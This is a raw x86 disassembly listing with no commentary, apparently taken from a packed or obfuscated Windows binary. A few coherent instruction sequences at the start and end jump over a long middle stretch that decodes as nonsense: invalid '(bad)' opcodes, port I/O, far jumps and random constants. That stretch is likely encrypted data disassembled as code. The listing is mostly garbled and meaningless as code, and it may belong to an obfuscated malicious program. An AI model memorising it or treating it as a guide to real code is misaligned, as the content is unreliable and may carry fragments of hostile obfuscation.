  407b1a:	mov    eax,DWORD PTR [ebp-0x10]
  407b1d:	add    eax,0xaa
  407b22:	push   eax
  407b23:	mov    eax,DWORD PTR [ebp-0x10]
  407b26:	mov    eax,DWORD PTR [eax+0x198]
  407b2c:	push   DWORD PTR [eax]
  407b2e:	jmp    0x407e7b
  407b33:	sahf   
  407b34:	das    
  407b35:	or     ah,BYTE PTR [edi]
  407b37:	mov    DWORD PTR [ecx],esp
  407b39:	mov    cl,0xb5
  407b3b:	pop    es
  407b3c:	mov    BYTE PTR [ebx],bl
  407b3e:	(bad)  
  407b3f:	lock mov ax,0x57a8
  407b44:	leave  
  407b45:	jo     0x407bb7
  407b47:	and    BYTE PTR [ebp+0x70],bh
  407b4a:	jo     0x407bb6
  407b4c:	pusha  
  407b4d:	dec    esi
  407b4e:	rol    BYTE PTR [edi-0x55],0x7c
  407b52:	mov    dl,0xc1
  407b54:	(bad)  
  407b55:	sbb    ch,BYTE PTR [edx-0x58]
  407b58:	cmp    esi,esi
  407b5a:	xor    BYTE PTR [eax+0x74],0xa0
  407b5e:	mov    bl,0xc
  407b60:	bound  esp,QWORD PTR [ebp+ecx*8-0x1f9765f5]
  407b67:	pusha  
  407b68:	aaa    
  407b69:	std    
  407b6a:	aaa    
  407b6b:	enter  0xcdec,0x6f
  407b6f:	lock sti 
  407b71:	xor    DWORD PTR [ebx+0x383c0352],edx
  407b77:	outs   dx,BYTE PTR ds:[esi]
  407b78:	xlat   BYTE PTR ds:[ebx]
  407b79:	out    dx,eax
  407b7a:	mov    esi,0x69981e86
  407b7f:	repnz sahf 
  407b81:	ja     0x407bdf
  407b83:	retf   
  407b84:	es inc edi
  407b86:	mov    dl,0xba
  407b88:	add    BYTE PTR [ebx],dl
  407b8a:	xor    eax,0x3d2cabc2
  407b8f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407b90:	or     DWORD PTR gs:[ebx-0x73],eax
  407b94:	jne    0x407bd4
  407b96:	cmp    eax,0x46a40ead
  407b9b:	or     eax,0x32b852d0
  407ba0:	xchg   esi,eax
  407ba1:	fidivr WORD PTR [ecx]
  407ba3:	xchg   ebx,edi
  407ba5:	test   eax,0x2024348a
  407baa:	sbb    al,0x43
  407bac:	mov    bh,0xd1
  407bae:	jge    0x407ba3
  407bb0:	in     al,dx
  407bb1:	in     eax,dx
  407bb2:	sbb    ecx,DWORD PTR [ebp+0x45]
  407bb5:	ja     0x407c26
  407bb7:	aam    0x59
  407bb9:	mov    dl,0x53
  407bbb:	mov    al,0x77
  407bbd:	xor    al,0x6f
  407bbf:	mov    al,0xe2
  407bc1:	das    
  407bc2:	push   edx
  407bc3:	and    BYTE PTR [ecx],bh
  407bc5:	ss mov esi,0x72f57c2d
  407bcb:	pop    edi
  407bcc:	es dec esi
  407bce:	or     ecx,DWORD PTR ds:0xce4f8d21
  407bd4:	stos   DWORD PTR es:[edi],eax
  407bd5:	mov    al,ds:0xed967351
  407bda:	rcl    DWORD PTR es:[edx+0x65ddb88a],1
  407be1:	xor    BYTE PTR cs:[ecx],0x45
  407be5:	push   cs
  407be6:	pop    esi
  407be7:	jbe    0x407bc0
  407be9:	fnsave [eax+0x42]
  407bec:	jmp    0x9c4a0159
  407bf1:	xchg   edi,eax
  407bf2:	shr    cl,0xef
  407bf5:	sar    bl,0x4f
  407bf8:	mov    edi,0xa91b924b
  407bfd:	call   0xb81f42
  407c02:	xchg   edx,eax
  407c03:	push   ecx
  407c04:	xchg   esp,eax
  407c05:	scas   eax,DWORD PTR es:[edi]
  407c06:	pop    ecx
  407c07:	dec    ecx
  407c08:	pop    ds
  407c09:	jno    0x407bdd
  407c0b:	lds    eax,FWORD PTR [ecx-0x666d4b57]
  407c11:	hlt    
  407c12:	test   eax,0x9493bec6
  407c17:	dec    esi
  407c18:	mov    edx,0x1131a0d5
  407c1d:	ja     0x407bfe
  407c1f:	adc    eax,edi
  407c21:	pushf  
  407c22:	add    DWORD PTR ds:0xf6872d6f,edx
  407c28:	out    0xfc,eax
  407c2a:	mov    dl,0xfc
  407c2c:	pop    edi
  407c2d:	rol    DWORD PTR [ebx+0x141ad994],1
  407c33:	iret   
  407c34:	mov    ah,0x85
  407c36:	bswap  edi
  407c38:	ins    BYTE PTR es:[edi],dx
  407c39:	test   DWORD PTR [edx-0x7a735cbb],edx
  407c3f:	mov    ah,0x4a
  407c41:	inc    edi
  407c42:	stc    
  407c43:	mov    al,0xd5
  407c45:	call   0xae2f:0x78ea9323
  407c4c:	mov    ebp,DWORD PTR [eax]
  407c4e:	jnp    0x407c46
  407c50:	outs   dx,BYTE PTR ds:[esi]
  407c51:	ins    DWORD PTR es:[edi],dx
  407c52:	or     DWORD PTR [ebp+0x71],ebp
  407c55:	or     cl,BYTE PTR [edi]
  407c57:	mov    dl,0xf0
  407c59:	sbb    dh,BYTE PTR ds:0x5a46646a
  407c5f:	cwde   
  407c60:	enter  0x424f,0xbd
  407c64:	mov    bh,0xbe
  407c66:	mov    esp,0x95ba8576
  407c6b:	retf   0xc0c0
  407c6e:	fadd   st(5),st
  407c70:	mov    esp,0xc3ece7df
  407c75:	pop    edx
  407c76:	out    0x73,al
  407c78:	xlat   BYTE PTR ds:[ebx]
  407c79:	test   bl,bh
  407c7b:	sub    ah,ch
  407c7d:	jns    0x407c28
  407c7f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407c80:	fstp   TBYTE PTR cs:[esi]
  407c83:	(bad)  
  407c84:	loop   0x407c6d
  407c86:	jge    0x407c47
  407c88:	int3   
  407c89:	inc    esp
  407c8a:	sbb    eax,DWORD PTR [ecx-0x6a794949]
  407c90:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407c91:	adc    eax,0xf19e15b3
  407c96:	stc    
  407c97:	aas    
  407c98:	mov    bh,0x69
  407c9a:	sub    esi,DWORD PTR [edi+edi*1-0x2dd42561]
  407ca1:	sub    eax,0xa374a97b
  407ca6:	call   0xfa15c995
  407cab:	jmp    0x407c96
  407cad:	mov    ds:0xd89bbc74,eax
  407cb2:	lahf   
  407cb3:	cmp    BYTE PTR [edx],ch
  407cb5:	dec    esp
  407cb6:	or     eax,0xd11a5e88
  407cbb:	pop    edi
  407cbc:	ss jg  0x407cf2
  407cbf:	jb     0x407c6a
  407cc1:	cs aad 0x42
  407cc4:	icebp  
  407cc5:	jno    0x407c76
  407cc7:	call   edi
  407cc9:	in     al,dx
  407cca:	aad    0x5a
  407ccc:	scas   al,BYTE PTR es:[edi]
  407ccd:	aaa    
  407cce:	pop    edi
  407ccf:	xchg   edx,eax
  407cd0:	(bad)  
  407cd1:	aad    0x94
  407cd3:	aas    
  407cd4:	aas    
  407cd5:	fcom   QWORD PTR [eax]
  407cd7:	stc    
  407cd8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407cd9:	aad    0x9a
  407cdb:	cmp    DWORD PTR [eiz*8+0x2ab811ed],ecx
  407ce2:	mov    ebx,0x48541c0d
  407ce7:	ret    0x2766
  407cea:	mov    edi,0xdc80e407
  407cef:	push   ecx
  407cf0:	imul   ebx,DWORD PTR [eax],0x85e607e8
  407cf6:	aam    0x6c
  407cf8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407cf9:	cmp    DWORD PTR [esi],ebp
  407cfb:	mov    ah,0x51
  407cfd:	loopne 0x407d51
  407cff:	and    ah,BYTE PTR [ecx+0xf]
  407d02:	sub    dl,bh
  407d04:	mov    ebp,0xaf77b08
  407d09:	ss push ebp
  407d0b:	daa    
  407d0c:	aaa    
  407d0d:	or     eax,DWORD PTR [edx+edx*8+0x159f2312]
  407d14:	js     0x407d01
  407d16:	shl    DWORD PTR [eax-0x2caa297a],1
  407d1c:	xor    al,0x1e
  407d1e:	add    al,0xf8
  407d20:	add    DWORD PTR [ecx],ecx
  407d22:	pop    ss
  407d23:	adc    esp,DWORD PTR [eax+0x63]
  407d26:	rcl    BYTE PTR [eax+0x15b24d42],1
  407d2c:	fs test al,0xc7
  407d2f:	(bad)  
  407d30:	imul   esi,DWORD PTR [edx-0x78bab9e0],0x13
  407d37:	leave  
  407d38:	lds    esi,FWORD PTR [edx-0x68]
  407d3b:	repnz repnz adc ecx,edi
  407d3f:	(bad)  
  407d40:	fmul   DWORD PTR [edi-0x320cd45]
  407d46:	jg     0x407dbe
  407d48:	pop    edx
  407d49:	popf   
  407d4a:	xor    eax,0xd5432416
  407d4f:	test   al,0x45
  407d51:	iret   
  407d52:	aad    0x24
  407d54:	lds    eax,FWORD PTR [ebx*2+0x5b20480e]
  407d5b:	fimul  DWORD PTR [ebp+0x1f7db32b]
  407d61:	cdq    
  407d62:	or     BYTE PTR [esi+0x6],ah
  407d65:	or     ah,BYTE PTR [eax+0x19b0a88a]
  407d6b:	popf   
  407d6c:	jno    0x407d37
  407d6e:	add    DWORD PTR [ecx-0x9],ebx
  407d71:	sbb    BYTE PTR [edx],cl
  407d73:	rcr    BYTE PTR [esi-0x5],1
  407d76:	sbb    dh,BYTE PTR ds:0x77096e54
  407d7c:	pop    ebp
  407d7d:	push   esp
  407d7e:	popa   
  407d7f:	pop    ds
  407d80:	sub    ecx,DWORD PTR [edx+0x66b22303]
  407d86:	mov    eax,0x89c4a336
  407d8b:	sahf   
  407d8c:	jmp    DWORD PTR es:[eax-0x61]
  407d90:	lods   al,BYTE PTR ds:[esi]
  407d91:	outs   dx,DWORD PTR ds:[esi]
  407d92:	jno    0x407d25
  407d94:	int    0xe8
  407d96:	pop    es
  407d97:	ins    BYTE PTR es:[edi],dx
  407d98:	in     al,0x8c
  407d9a:	(bad)  
  407d9b:	push   es
  407d9c:	gs fwait
  407d9e:	dec    edx
  407d9f:	pop    esi
  407da0:	shl    DWORD PTR [esi-0x4d],0x19
  407da4:	leave  
  407da5:	and    eax,0x636b9e2f
  407daa:	sbb    eax,0x77d3b792
  407daf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407db0:	data16 cli 
  407db2:	leave  
  407db3:	sbb    ebx,esi
  407db5:	xchg   esi,eax
  407db6:	or     ah,BYTE PTR [esi]
  407db8:	pushf  
  407db9:	mul    DWORD PTR [edi]
  407dbb:	mov    cl,0x37
  407dbd:	or     eax,0x867c6192
  407dc2:	cmp    edx,eax
  407dc4:	scas   al,BYTE PTR es:[edi]
  407dc5:	jle    0x407d88
  407dc7:	cli    
  407dc8:	dec    edx
  407dc9:	dec    eax
  407dca:	es cli 
  407dcc:	push   ds
  407dcd:	cmp    eax,0xa87898c6
  407dd2:	xchg   esp,eax
  407dd3:	mov    BYTE PTR [ecx+0x58],0xc4
  407dd7:	mov    ebp,0xf7d232f2
  407ddc:	cwde   
  407ddd:	mov    es,WORD PTR ds:0xb0e46c41
  407de3:	test   esi,0xa1584aa2
  407de9:	mov    eax,ds:0x8274385e
  407dee:	rcl    ch,1
  407df0:	push   cs
  407df1:	ret    0xe8b8
  407df4:	repnz in al,dx
  407df6:	fidivr WORD PTR [eax+0x272f07df]
  407dfc:	es je  0x407e58
  407dff:	in     al,dx
  407e00:	mov    ds:0x4bc87f3f,eax
  407e05:	inc    ebx
  407e06:	sbb    dh,BYTE PTR [edx-0x78dd7893]
  407e0c:	dec    eax
  407e0d:	mov    al,0x70
  407e0f:	bnd repz call 0xe7debe4c
  407e16:	xor    eax,0xa3b85d56
  407e1b:	inc    eax
  407e1c:	mov    ds:0x9d199b7c,eax
  407e21:	cmp    eax,0x382bc148
  407e26:	jne    0x407e2c
  407e28:	loope  0x407dce
  407e2a:	lods   eax,DWORD PTR ds:[esi]
  407e2b:	cld    
  407e2c:	sub    ecx,esp
  407e2e:	(bad)  
  407e30:	test   DWORD PTR [esi],esi
  407e32:	push   ebx
  407e33:	push   ecx
  407e34:	xchg   ah,dl
  407e36:	mov    eax,0xa7ca43e5
  407e3b:	sbb    esp,DWORD PTR [ebx+0xdf64c19]
  407e41:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407e42:	aas    
  407e43:	inc    ebx
  407e44:	loopne 0x407ead
  407e46:	jbe    0x407deb
  407e48:	pop    esi
  407e49:	mov    eax,ds:0xf2493993
  407e4e:	outs   dx,BYTE PTR ds:[esi]
  407e4f:	mov    edx,0x896f84eb
  407e54:	sbb    al,0xe
  407e56:	cmp    eax,0x9ff9d21d
  407e5b:	aam    0x5f
  407e5d:	mov    ecx,DWORD PTR [ecx]
  407e5f:	aam    0x48
  407e61:	mov    esp,0xee9b74e6
  407e66:	stc    
  407e67:	mov    ch,0x7d
  407e69:	cmp    al,0x1b
  407e6b:	xor    al,0xdb
  407e6d:	cmc    
  407e6e:	mov    ecx,0x4643c26a
  407e73:	sar    BYTE PTR [esi],1
  407e75:	in     al,0x4f
  407e77:	cmp    eax,0xe8d628f6
  407e7c:	cmp    esp,DWORD PTR [edx+0x45890000]
  407e82:	clc    
  407e83:	cmp    DWORD PTR [ebp-0x8],0x0
  407e87:	jmp    0x4081d4
  407e8c:	in     eax,0xe6
  407e8e:	outs   dx,DWORD PTR ds:[esi]
  407e8f:	pop    ebp
  407e90:	outs   dx,DWORD PTR ds:[esi]
  407e91:	jne    0x407e88
  407e93:	data16 hlt 
  407e95:	test   ebx,eax
  407e97:	pushf  
  407e98:	aam    0x25
  407e9a:	xor    eax,0x70d50723
  407e9f:	jo     0x407ec1
  407ea1:	jge    0x407f13
  407ea3:	jo     0x407eed
  407ea5:	mov    eax,0x6d57e0ee
  407eaa:	jo     0x407ef8
  407eac:	aas    
  407ead:	or     al,0x99
  407eaf:	and    esp,DWORD PTR [ebp-0x49]
  407eb2:	xchg   esi,eax
  407eb3:	xchg   esp,eax
  407eb4:	sub    ebx,DWORD PTR [edx]
  407eb6:	int3   
  407eb7:	imul   ebx,edi,0x97d8660f
  407ebd:	cmp    al,0xc0
  407ebf:	or     eax,edx
  407ec1:	xchg   esp,eax
  407ec2:	xchg   edx,eax
  407ec3:	mov    edi,0x77adbc06
  407ec8:	or     ch,BYTE PTR [eax]
  407eca:	jecxz  0x407e69
  407ecc:	sbb    BYTE PTR [ebx+0x3b],cl
  407ecf:	adc    al,0xaf
  407ed1:	inc    ebp
  407ed2:	xor    ebp,DWORD PTR [ecx]
  407ed4:	sbb    BYTE PTR [edx],0xe2
  407ed7:	jb     0x407e7e
  407ed9:	(bad)  
  407edb:	pop    esp
  407edc:	sbb    eax,0xdf1a5c25
  407ee1:	hlt    
  407ee2:	ror    DWORD PTR [esi-0x45],cl
  407ee5:	xor    eax,0x53708aae
  407eea:	cwde   
  407eeb:	(bad)  
  407eec:	mov    esi,0xe2578a8f
  407ef1:	or     dh,bl
  407ef3:	xor    dh,ch
  407ef5:	mov    ah,0x46
  407ef7:	shr    BYTE PTR [edx],1
  407ef9:	mov    ebx,0x9a178ca6
  407efe:	lods   al,BYTE PTR ds:[esi]
  407eff:	or     al,0x6b
  407f01:	dec    DWORD PTR [ecx-0x10275435]
  407f07:	adc    eax,0xe2be54d4
  407f0c:	outs   dx,BYTE PTR ds:[esi]
  407f0d:	jbe    0x407e93
  407f0f:	fdiv   st,st(7)
  407f11:	out    0x57,eax
  407f13:	jo     0x407f6a
  407f15:	jg     0x407f4c
  407f17:	jmp    0xc6cc:0xeb9797a5
  407f1e:	pop    edi
  407f1f:	jmp    0x62e:0xc8eac44b
  407f26:	or     al,0x9b
  407f28:	mov    DWORD PTR [edi-0x6d],ebx
  407f2b:	sub    edx,DWORD PTR [esi+0xe]
  407f2e:	cmp    ch,BYTE PTR [edi]
  407f30:	fadd   DWORD PTR fs:[ebx+ebx*8]
  407f34:	push   edi
  407f35:	(bad)  
  407f36:	scas   al,BYTE PTR es:[edi]
  407f37:	fadd   QWORD PTR [edx*1-0x77f225bd]
  407f3e:	xlat   BYTE PTR ds:[ebx]
  407f3f:	aaa    
  407f40:	sbb    DWORD PTR [esi],edi
  407f42:	mov    ebx,0xf83f425
  407f47:	xchg   ecx,eax
  407f48:	fild   DWORD PTR [ecx+ebp*2+0x39]
  407f4c:	sbb    eax,0xd2f3a4ea
  407f51:	inc    ebp
  407f52:	jg     0x407fa8
  407f54:	xchg   ecx,eax
  407f55:	in     eax,0x78
  407f57:	inc    esi
  407f58:	retf   
  407f59:	cmp    edx,0xffffffcd
  407f5c:	and    DWORD PTR [ecx],edx
  407f5e:	imul   edi,DWORD PTR [esi+0x10],0x7a
  407f62:	in     eax,0x5c
  407f64:	cmp    edx,ebx
  407f66:	loop   0x407fc2
  407f68:	scas   eax,DWORD PTR es:[edi]
  407f69:	cmp    BYTE PTR [edx],ah
  407f6b:	ss pusha 
  407f6d:	mov    dl,BYTE PTR [esp+ebp*4-0x4da450d3]
  407f74:	lds    ebx,FWORD PTR [ebx+0x528c1ed]
  407f7a:	into   
  407f7b:	and    bl,BYTE PTR [edx-0x6f6e968c]
  407f81:	jg     0x407fb1
  407f83:	or     ecx,esi
  407f85:	xchg   BYTE PTR ds:0x35fb9022,ch
  407f8b:	sbb    DWORD PTR [ecx-0x1e6300f6],edi
  407f91:	xchg   edi,eax
  407f92:	sbb    al,BYTE PTR [ecx+0xca3cc41]
  407f98:	dec    ebp
  407f99:	jp     0x407fc6
  407f9b:	addr16 out 0x23,eax
  407f9e:	loop   0x407fdf
  407fa0:	push   ebx
  407fa1:	adc    al,0x57
  407fa3:	push   ebx
  407fa4:	call   0x89cb:0xa00f29a7
  407fab:	inc    eax
  407fac:	scas   al,BYTE PTR es:[edi]
  407fad:	pop    edx
  407fae:	or     al,0x8b
  407fb0:	cmp    DWORD PTR [eax],esp
  407fb2:	pop    ecx
  407fb3:	in     eax,0xe9
  407fb5:	add    esp,DWORD PTR [ebx-0xc]
  407fb8:	ja     0x40801f
  407fba:	jnp    0x408028
  407fbc:	dec    eax
  407fbd:	sar    al,0xc1
  407fc0:	sbb    cl,BYTE PTR [ebx+0x7ab48208]
  407fc6:	inc    ebp
  407fc7:	or     BYTE PTR [edi-0x7e88db3b],al
  407fcd:	repnz xor edi,edi
  407fd0:	pop    edi
  407fd1:	and    eax,0x3311c1df
  407fd6:	adc    bl,BYTE PTR [edx+0x19]
  407fd9:	loopne 0x40801b
  407fdb:	xor    eax,0xf0bb45af
  407fe0:	xchg   ebx,eax
  407fe1:	inc    esp
  407fe2:	ins    BYTE PTR es:[edi],dx
  407fe3:	mov    ds:0x2af1fb7b,al
  407fe8:	adc    al,0xfe
  407fea:	mov    al,ds:0x32626829
  407fef:	pusha  
  407ff0:	ja     0x408053
  407ff2:	and    eax,0xa3a0846b
  407ff7:	push   es
  407ff8:	stos   BYTE PTR es:[edi],al
  407ff9:	or     al,0xc1
  407ffb:	stc    
  407ffc:	sub    ebp,ebp
  407ffe:	mov    ecx,0x65ef1f5f
  408003:	adc    dl,BYTE PTR [edi]
  408005:	jmp    0x7e19:0xf2a65d92
  40800c:	jno    0x408040
  40800e:	sbb    esi,edi
  408010:	dec    ebp
  408011:	xchg   esi,eax
  408012:	sbb    eax,0xd4ac43dd
  408017:	mov    ds:0x3c6e2e20,eax
  40801c:	fucomi st,st(5)
  40801e:	jns    0x408076
  408020:	(bad)  
  408022:	out    dx,al
  408023:	mov    ebp,DWORD PTR [edx+ebx*8-0x75828dd4]
  40802a:	outs   dx,DWORD PTR ds:[esi]
  40802b:	cld    
  40802c:	pop    edx
  40802d:	adc    ebp,DWORD PTR [ebp+0xe5d3295]
  408033:	and    DWORD PTR [edx+eax*8],ebx
  408036:	pop    ds
  408037:	xchg   edi,eax
  408038:	mov    BYTE PTR [eax+0x9],cl
  40803b:	std    
  40803c:	lods   al,BYTE PTR ds:[esi]
  40803d:	mov    ds:0xd8cb4b56,al
  408042:	add    DWORD PTR [edx],ebp
  408044:	lds    ecx,FWORD PTR [ebp-0x38]
  408047:	shl    bl,cl
  408049:	enter  0x4579,0x30
  40804d:	jo     0x40808f
  40804f:	lds    esi,FWORD PTR [ecx]
  408051:	fcomp  DWORD PTR [edx-0x7952c7fe]
  408057:	pop    ecx
  408058:	xchg   edx,eax
  408059:	inc    ebx
  40805a:	shld   DWORD PTR [edi+eiz*4],esi,0x88
  40805f:	xchg   esi,eax
  408060:	sub    edx,ebx
  408062:	jmp    0x40800f
  408064:	and    BYTE PTR [esp+edx*1+0x66],cl
  408068:	outs   dx,DWORD PTR ds:[esi]
  408069:	adc    BYTE PTR [edi+0x31813274],ah
  40806f:	pushf  
  408070:	sbb    eax,0x16deb3a2
  408075:	movd   eax,mm4
  408078:	fchs   
  40807a:	(bad)  
  40807b:	mov    ecx,0x71f4ba87
  408080:	in     al,dx
  408081:	ret    0x266e
  408084:	adc    al,0xc9
  408086:	mov    ecx,0x1ae76ab1
  40808b:	pop    edx
  40808c:	pop    ebx
  40808d:	(bad)  
  40808f:	xor    eax,0x19c5044d
  408094:	das    
  408095:	ja     0x408034
  408097:	rcr    BYTE PTR [edi-0x6d786b00],cl
  40809d:	cmp    dh,BYTE PTR [edx]
  40809f:	adc    al,0x5d
  4080a1:	in     al,0xd6
  4080a3:	out    dx,al
  4080a4:	push   edi
  4080a5:	repz je 0x4080a8
  4080a8:	loop   0x40805e
  4080aa:	mov    ch,0xcd
  4080ac:	fsubr  st(0),st
  4080ae:	mov    BYTE PTR [eax],dh
  4080b0:	cmp    DWORD PTR [edx-0x1d1aacca],esi
  4080b6:	sub    ebx,0xffffffdc
  4080b9:	push   ebx
  4080ba:	and    al,0x4a
  4080bc:	inc    edi
  4080bd:	pop    ds
  4080be:	sti    
  4080bf:	jb     0x40805f
  4080c1:	push   0x80175c5b
  4080c6:	xor    al,0xf1
  4080c8:	or     esi,DWORD PTR [edx-0x5a]
  4080cb:	shl    DWORD PTR [esi-0x5b],0xd9
  4080cf:	scas   eax,DWORD PTR es:[edi]
  4080d0:	icebp  
  4080d1:	mov    DWORD PTR [ecx-0x47],ebx
  4080d4:	mov    esp,0x1741467f
  4080d9:	shl    cl,0xa3
  4080dc:	ins    DWORD PTR es:[edi],dx
  4080dd:	jecxz  0x40808e
  4080df:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4080e0:	mov    edx,0xc0647339
  4080e5:	pop    ss
  4080e6:	scas   al,BYTE PTR es:[edi]
  4080e7:	(bad)  
  4080e8:	rcl    BYTE PTR [edi],0x1b
  4080eb:	stc    
  4080ec:	inc    ecx
  4080ed:	jg     0x408098
  4080ef:	xor    dh,cl
  4080f1:	mov    dh,BYTE PTR [ebx+0xd]
  4080f4:	loop   0x40811f
  4080f6:	inc    esi
  4080f7:	jo     0x408161
  4080f9:	data16 fistp DWORD PTR es:[edi]
  4080fd:	add    BYTE PTR [edi-0x2b],bl
  408100:	push   0x4b75982d
  408105:	test   al,0xdb
  408107:	mov    eax,edx
  408109:	popf   
  40810a:	fist   WORD PTR [ecx+0x6a]
  40810d:	in     al,0xf8
  40810f:	fs push 0x1b8a82b2
  408115:	xor    BYTE PTR ds:0xc06cdc25,0xac
  40811c:	sub    esi,edx
  40811e:	or     ah,dl
  408120:	sub    eax,0x262708c6
  408125:	adc    bl,cl
  408127:	jg     0x408199
  408129:	data16 mov BYTE PTR [edx],cl
  40812c:	out    0x7d,eax
  40812e:	dec    ebp
  40812f:	ret    
  408130:	adc    eax,0xd3188bd
  408135:	jg     0x40817f
  408137:	pushf  
  408138:	mov    bh,0x33
  40813a:	hlt    
  40813b:	inc    esi
  40813c:	frstor [eax+0x0]
  40813f:	sub    eax,0x4704b074
  408144:	rcr    DWORD PTR [eax+ecx*4-0x2164ad76],cl
  40814b:	jmp    0xee2e38d
  408150:	dec    esp
  408151:	popw   es
  408153:	mov    bh,0x1e
  408155:	(bad)  
  408156:	test   al,0x5a
  408158:	cwde   
  408159:	mov    dh,0xd0
  40815b:	arpl   WORD PTR [edx],bp
  40815d:	or     al,BYTE PTR [ecx]
  40815f:	test   ch,al
  408161:	scas   eax,DWORD PTR es:[edi]
  408162:	dec    ebx
  408163:	int    0xf7
  408165:	inc    esi
  408166:	jbe    0x408114
  408168:	cmp    ch,al
  40816a:	ret    
  40816b:	mov    al,0x6e
  40816d:	mov    edi,0xa8bec438
  408172:	mov    BYTE PTR [ebx],al
  408174:	mov    ?,ecx
  408176:	sub    DWORD PTR [ebx+0x28effc54],esi
  40817c:	sahf   
  40817d:	jo     0x4081e4
  40817f:	and    al,0x7b
  408181:	popf   
  408182:	rcl    edx,cl
  408184:	mov    ds:0x5d8a0b1a,al
  408189:	mov    bh,0xa6
  40818b:	call   0x705a:0x38ecb01f
  408192:	pusha  
  408193:	mov    bh,0x9a
  408195:	(bad)  
  408196:	xor    eax,0xca638872
  40819b:	aam    0x68
  40819d:	mov    ebp,0xdf225eac
  4081a2:	hlt    
  4081a3:	push   ss
  4081a4:	jl     0x4081c9
  4081a6:	jb     0x4081b7
  4081a8:	mov    ds:0xfc9db69,al
  4081ad:	and    esp,ebx
  4081af:	sbb    al,0xd5
  4081b1:	popa   
  4081b2:	jbe    0x4081f8
  4081b4:	xor    al,0xee
  4081b6:	or     al,0x61
  4081b8:	sbb    DWORD PTR [ecx],ebp
  4081ba:	mov    ch,BYTE PTR [ecx-0x64]
  4081bd:	push   esp
  4081be:	xor    al,0x75
  4081c0:	add    eax,0x22b789ac
  4081c5:	mov    eax,ds:0x64bbdaef
  4081ca:	xchg   DWORD PTR [eax-0x7e],esp
  4081cd:	jl     0x408212
  4081cf:	inc    esi
  4081d0:	int    0xe6
  4081d2:	cmp    DWORD PTR [ebx-0x73],0x45
  4081d6:	add    al,0x89
  4081d8:	inc    ebp
  4081d9:	loopne 0x4081ea
  4081db:	test   BYTE PTR [esp+edx*1+0x458d0000],cl
  4081e2:	call   0xd4860d37
  4081e7:	xor    eax,esi
  4081e9:	add    eax,edi
  4081eb:	push   eax
  4081ec:	mov    eax,DWORD PTR [ebp-0x1c]
  4081ef:	xor    eax,esi
  4081f1:	add    eax,edi
  4081f3:	push   eax
  4081f4:	push   DWORD PTR [ebp-0x8]
  4081f7:	lea    eax,[ebp-0x78]
  4081fa:	push   eax
  4081fb:	push   DWORD PTR [ebp-0xc]
  4081fe:	push   DWORD PTR [ebp-0x14]
  408201:	call   0x406508
  408206:	test   eax,eax
  408208:	je     0x408233
  40820e:	lea    eax,[ebp-0x78]
  408211:	push   eax
  408212:	mov    eax,DWORD PTR [ebp-0x14]
  408215:	xor    eax,esi
  408217:	add    eax,edi
  408219:	push   eax
  40821a:	mov    eax,DWORD PTR [ebp-0x10]
  40821d:	add    eax,0xee
  408222:	push   eax
  408223:	mov    eax,DWORD PTR [ebp-0x10]
  408226:	mov    eax,DWORD PTR [eax+0x198]
  40822c:	push   DWORD PTR [eax]
  40822e:	call   0x4120bb
  408233:	mov    ecx,DWORD PTR [ebp-0x1c]
  408236:	xor    ecx,esi
  408238:	mov    eax,0xffcd8d64
  40823d:	sub    eax,ecx
  40823f:	sub    eax,DWORD PTR [ebp-0x8]
  408242:	mov    ecx,DWORD PTR [ebp-0x30]
  408245:	add    ecx,eax
  408247:	mov    eax,DWORD PTR [ebp-0x8]
  40824a:	mov    DWORD PTR [eax+0x1],ecx
  40824d:	mov    al,BYTE PTR [ebp-0x1]
  408250:	mov    ecx,DWORD PTR [ebp-0x8]
  408253:	xor    al,0x47
  408255:	sub    al,0x37
  408257:	jmp    0x4085a4
  40825c:	ja     0x408201
  40825e:	mov    ecx,0x7175496f
  408263:	mov    ds:0xd6da6ce9,eax
  408268:	nop
  408269:	pop    eax
  40826b:	ja     0x4082a4
  40826d:	shl    BYTE PTR [eax+0x70],cl
  408270:	and    BYTE PTR [ebp+0x70],bh
  408273:	jo     0x408264
  408275:	stc    
  408276:	cmovge edx,DWORD PTR [ebp-0x296c6cf1]
  40827d:	xchg   edx,eax
  40827e:	xor    esp,DWORD PTR [ebx-0x22a8204e]
  408284:	jmp    FWORD PTR [ecx+0x19]
  408287:	xor    BYTE PTR [ebx+0x36],dh
  40828a:	dec    edi
  40828b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40828c:	js     0x408210
  40828e:	out    0x4,al
  408290:	ja     0x408224
  408292:	sbb    DWORD PTR [eax],edi
  408294:	pop    edx
  408295:	sub    ebp,DWORD PTR [edi+eax*4-0x6f]
  408299:	mov    ch,0xf9
  40829b:	test   dh,dh
  40829d:	bnd js 0x408310
  4082a0:	and    al,0xb2
  4082a2:	jnp    0x40823d
  4082a4:	mov    DWORD PTR [edi-0x56],esp
  4082a7:	popa   
  4082a8:	pop    es
  4082a9:	jg     0x4082e9
  4082ab:	jo     0x40832a
  4082ad:	mov    ax,0xfd1
  4082b2:	jmp    0x408303
  4082b4:	lds    ebx,FWORD PTR [esi-0x2d85e2c3]
  4082ba:	das    
  4082bb:	sbb    ebx,DWORD PTR [esi+0x48e10719]
  4082c1:	inc    edi
  4082c2:	outs   dx,BYTE PTR ds:[esi]
  4082c3:	mov    ebx,0xf2b75a4a
  4082c8:	jmp    0xdb88:0xc72d4557
  4082cf:	nop
  4082d0:	(bad)  
  4082d1:	in     al,dx
  4082d2:	call   0x4b63:0x6796b676
  4082d9:	add    al,0xde
  4082db:	and    DWORD PTR [ebp-0x7a81f397],ebp
  4082e1:	or     al,0x25
  4082e3:	xor    eax,0x4337ba59
  4082e8:	inc    ebx
  4082e9:	mov    ds:0xd4b2c4f8,eax
  4082ee:	xchg   BYTE PTR [ebx],cl
  4082f0:	adc    al,0x92
  4082f2:	jmp    0x4082f1
  4082f4:	xchg   ebx,eax
  4082f5:	or     eax,0x1e24ea02
  4082fa:	mov    al,0xb3
  4082fc:	imul   eax
  4082fe:	xchg   edx,eax
  4082ff:	aaa    
  408300:	lods   al,BYTE PTR ds:[si]
  408302:	cdq    
  408303:	retf   
  408304:	sbb    DWORD PTR [ebx],0xffffff93
  408307:	addr16 and ecx,ecx
  40830a:	aaa    
